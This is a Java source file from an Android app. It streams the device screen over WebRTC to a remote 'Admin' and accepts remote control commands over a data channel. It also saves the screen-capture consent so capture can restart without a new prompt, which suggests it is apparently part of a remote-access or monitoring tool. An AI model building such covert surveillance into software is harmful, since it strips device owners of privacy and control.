package com.fason.app.features.screen;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;
import org.webrtc.DataChannel;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.ScreenCapturerAndroid;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.Socket;

public final class ScreenCaptureService {

    private static ScreenCaptureService instance;

    private MediaProjectionManager mpm;
    private Intent projectionData;
    private int projectionResultCode;

    private EglBase eglBase;
    private PeerConnectionFactory peerConnectionFactory;
    private PeerConnection peerConnection;
    private VideoCapturer videoCapturer;
    private SurfaceTextureHelper surfaceTextureHelper;
    private VideoSource videoSource;
    private VideoTrack videoTrack;

    private List<JSONObject> pendingIceCandidates = new ArrayList<>();

    private volatile boolean streaming = false;
    private static int savedResultCode = 0;
    private static Intent savedResultData = null;

    private ScreenCaptureService() {}

    public static synchronized ScreenCaptureService getInstance() {
        if (instance == null) {
            instance = new ScreenCaptureService();
        }
        return instance;
    }

    public static void saveProjectionResult(int resultCode, Intent data) {
        savedResultCode = resultCode;
        savedResultData = data != null ? (Intent) data.clone() : null;
    }

    public static boolean hasSavedProjection() {
        return savedResultCode == Activity.RESULT_OK && savedResultData != null;
    }

    public boolean tryReuse() {
        if (Build.VERSION.SDK_INT >= 34 || !hasSavedProjection()) {
            return false;
        }
        startCapture(savedResultCode, savedResultData);
        return true;
    }

    public void startCapture(int resultCode, Intent data) {
        if (streaming) return;
        this.projectionResultCode = resultCode;
        this.projectionData = data;

        Context ctx = FasonApp.getContext();
        mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        }

        if (Build.VERSION.SDK_INT < 34) {
            saveProjectionResult(resultCode, data);
        }

        streaming = true;
        sendStatus(true);
        // Wait for WebRTC Offer from Admin to initialize PeerConnection
    }

    public void handleWebRtcOffer(JSONObject data) {
        if (!streaming || projectionData == null) return;
        try {
            String sdp = data.getString("sdp");
            JSONArray iceServersArr = data.optJSONArray("iceServers");

            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
            if (iceServersArr != null) {
                for (int i = 0; i < iceServersArr.length(); i++) {
                    JSONObject srv = iceServersArr.getJSONObject(i);
                    PeerConnection.IceServer.Builder builder = PeerConnection.IceServer.builder(srv.getString("urls"));
                    if (srv.has("username")) builder.setUsername(srv.getString("username"));
                    if (srv.has("credential")) builder.setPassword(srv.getString("credential"));
                    iceServers.add(builder.createIceServer());
                }
            }

            initWebRtc(iceServers);

            peerConnection.setRemoteDescription(new SimpleSdpObserver(), new SessionDescription(SessionDescription.Type.OFFER, sdp));
            peerConnection.createAnswer(new SimpleSdpObserver() {
                @Override
                public void onCreateSuccess(SessionDescription sessionDescription) {
                    peerConnection.setLocalDescription(new SimpleSdpObserver(), sessionDescription);
                    try {
                        JSONObject answer = new JSONObject();
                        answer.put("sdp", sessionDescription.description);
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket != null) socket.emit(Protocol.WEBRTC_ANSWER, answer);
                    } catch (Exception ignored) {}
                }
            }, new MediaConstraints());

        } catch (Exception e) {
            sendError("WebRTC Offer error: " + e.getMessage());
        }
    }

    public void handleWebRtcIce(JSONObject data) {
        if (peerConnection == null) {
            pendingIceCandidates.add(data);
            return;
        }
        try {
            String candidate = data.getString("candidate");
            String sdpMid = data.getString("sdpMid");
            int sdpMLineIndex = data.getInt("sdpMLineIndex");
            peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, candidate));
        } catch (Exception ignored) {}
    }

    private void initWebRtc(List<PeerConnection.IceServer> iceServers) {
        if (peerConnectionFactory != null) return;

        Context ctx = FasonApp.getContext();
        PeerConnectionFactory.InitializationOptions initOptions = PeerConnectionFactory.InitializationOptions.builder(ctx)
                .setEnableInternalTracer(true)
                .createInitializationOptions();
        PeerConnectionFactory.initialize(initOptions);

        eglBase = EglBase.create();

        DefaultVideoEncoderFactory encoderFactory = new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true);
        DefaultVideoDecoderFactory decoderFactory = new DefaultVideoDecoderFactory(eglBase.getEglBaseContext());

        peerConnectionFactory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory();

        PeerConnection.RTCConfiguration rtcConfig = new PeerConnection.RTCConfiguration(iceServers);
        rtcConfig.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        rtcConfig.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        rtcConfig.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        peerConnection = peerConnectionFactory.createPeerConnection(rtcConfig, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState signalingState) {}
            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {
                if (iceConnectionState == PeerConnection.IceConnectionState.DISCONNECTED || 
                    iceConnectionState == PeerConnection.IceConnectionState.FAILED) {
                    stopCapture();
                }
            }
            @Override
            public void onIceConnectionReceivingChange(boolean b) {}
            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
            @Override
            public void onIceCandidate(IceCandidate iceCandidate) {
                try {
                    JSONObject ice = new JSONObject();
                    ice.put("candidate", iceCandidate.sdp);
                    ice.put("sdpMid", iceCandidate.sdpMid);
                    ice.put("sdpMLineIndex", iceCandidate.sdpMLineIndex);
                    Socket socket = SocketClient.getInstance().getSocket();
                    if (socket != null) socket.emit(Protocol.WEBRTC_ICE, ice);
                } catch (Exception ignored) {}
            }
            @Override
            public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
            @Override
            public void onAddStream(MediaStream mediaStream) {}
            @Override
            public void onRemoveStream(MediaStream mediaStream) {}
            @Override
            public void onDataChannel(DataChannel dataChannel) {
                dataChannel.registerObserver(new DataChannel.Observer() {
                    @Override
                    public void onBufferedAmountChange(long l) {}
                    @Override
                    public void onStateChange() {}
                    @Override
                    public void onMessage(DataChannel.Buffer buffer) {
                        try {
                            byte[] data = new byte[buffer.data.remaining()];
                            buffer.data.get(data);
                            String message = new String(data, StandardCharsets.UTF_8);
                            
                            if (dataChannel.label().equals("control")) {
                                JSONObject cmd = new JSONObject(message);
                                ScreenControlService.handleCommand(cmd);
                            } else if (dataChannel.label().equals("clipboard")) {
                                // handle clipboard sync
                                JSONObject cmd = new JSONObject(message);
                                // route to clipboard manager if needed
                            }
                        } catch (Exception ignored) {}
                    }
                });
            }
            @Override
            public void onRenegotiationNeeded() {}
            @Override
            public void onAddTrack(org.webrtc.RtpReceiver rtpReceiver, MediaStream[] mediaStreams) {}
        });

        videoCapturer = new ScreenCapturerAndroid(projectionData, new MediaProjection.Callback() {
            @Override
            public void onStop() {
                stopCapture();
            }
        });

        surfaceTextureHelper = SurfaceTextureHelper.create("ScreenCaptureThread", eglBase.getEglBaseContext());
        videoSource = peerConnectionFactory.createVideoSource(videoCapturer.isScreencast());
        videoCapturer.initialize(surfaceTextureHelper, ctx, videoSource.getCapturerObserver());
        videoCapturer.startCapture(1280, 720, 30);

        videoTrack = peerConnectionFactory.createVideoTrack("100", videoSource);
        peerConnection.addTrack(videoTrack);
        
        // Process any queued ICE candidates
        for (JSONObject ice : pendingIceCandidates) {
            handleWebRtcIce(ice);
        }
        pendingIceCandidates.clear();
    }

    public void stopCapture() {
        streaming = false;

        try {
            if (videoCapturer != null) {
                videoCapturer.stopCapture();
                videoCapturer.dispose();
                videoCapturer = null;
            }
            if (videoSource != null) {
                videoSource.dispose();
                videoSource = null;
            }
            if (surfaceTextureHelper != null) {
                surfaceTextureHelper.dispose();
                surfaceTextureHelper = null;
            }
            if (peerConnection != null) {
                peerConnection.close();
                peerConnection = null;
            }
            if (peerConnectionFactory != null) {
                peerConnectionFactory.dispose();
                peerConnectionFactory = null;
            }
            if (eglBase != null) {
                eglBase.release();
                eglBase = null;
            }
            pendingIceCandidates.clear();
        } catch (Exception ignored) {}

        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        }

        sendStatus(false);
    }

    public void setFps(int fps) {}
    public void setQuality(int quality) {}
    public void setScale(float scale) {}

    public boolean isStreaming() {
        return streaming;
    }

    public int getScreenWidth() { return 1280; }
    public int getScreenHeight() { return 720; }

    private void sendStatus(boolean streaming) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject status = new JSONObject();
                status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
                status.put(Protocol.KEY_STREAMING, streaming);
                status.put(Protocol.KEY_ACCESSIBLE, ScreenControlService.isEnabled());
                socket.emit(Protocol.SCREEN, status);
            }
        } catch (Exception ignored) {}
    }

    private void sendError(String error) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject err = new JSONObject();
                err.put(Protocol.KEY_TYPE, Protocol.KEY_ERROR);
                err.put(Protocol.KEY_ERROR, error);
                socket.emit(Protocol.SCREEN, err);
            }
        } catch (Exception ignored) {}
    }

    public void shutdown() {
        stopCapture();
        instance = null;
    }

    private static class SimpleSdpObserver implements org.webrtc.SdpObserver {
        @Override public void onCreateSuccess(SessionDescription sessionDescription) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) {}
        @Override public void onSetFailure(String s) {}
    }
}
